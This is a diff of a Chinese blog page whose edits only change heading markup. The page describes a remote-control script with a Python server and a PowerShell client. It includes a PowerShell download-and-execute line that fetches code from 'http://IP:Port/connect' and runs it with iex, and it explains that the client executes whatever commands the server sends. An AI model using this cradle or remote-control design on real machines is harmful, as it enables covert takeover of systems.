@@ -229,22 +229,22 @@
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
-      		<p>##简介##<br>从Win7开始，Windows全部自带极其强大的Powershell，Windows的新利器！我之后会陆续写一些关于Powershell应用的文章。</p>
+      		<p>##简介<br>从Win7开始，Windows全部自带极其强大的Powershell，Windows的新利器！我之后会陆续写一些关于Powershell应用的文章。</p>
 <p>这是用Python写服务端，PowerShell写客户端，基于Socket的一个远控脚本。<br>其实Powershell也可以写服务端，选Python写服务端主要是为了在Linux服务器上也能跑。</p>
-<p>##原理##<br><code>iex (New-Object Sys.Net.Webclient).DownloadString(&quot;http://IP:Port/connect&quot;)</code> </p>
+<p>##原理<br><code>iex (New-Object Sys.Net.Webclient).DownloadString(&quot;http://IP:Port/connect&quot;)</code> </p>
 <ul>
 <li>用PowerShell上面的命令发Http请求得到客户端代码并用IEX命令执行</li>
 <li>客户端再次与服务端建立TCP链接，执行接收到的代码并返回处理结果</li>
 <li>服务端通过建立连接后收到的第一段数据判断是哪一种请求</li>
 </ul>
 <p>客户端代码完全可以放在Github或者其他Web服务器上，用同一个服务器与端口纯粹是为了快速搭建。</p>
-<p>##TODO##</p>
+<p>##TODO</p>
 <ul>
 <li>客户端增加注册表操作</li>
 <li>优化文件上传下载</li>
 <li>客户端的异常处理</li>
 </ul>
-<p>##代码##</p>
+<p>##代码</p>
 <pre><code><span class="comment"># -*- coding:utf-8 -*-</span>
 <span class="keyword">import</span> sys
 <span class="keyword">import</span> socket
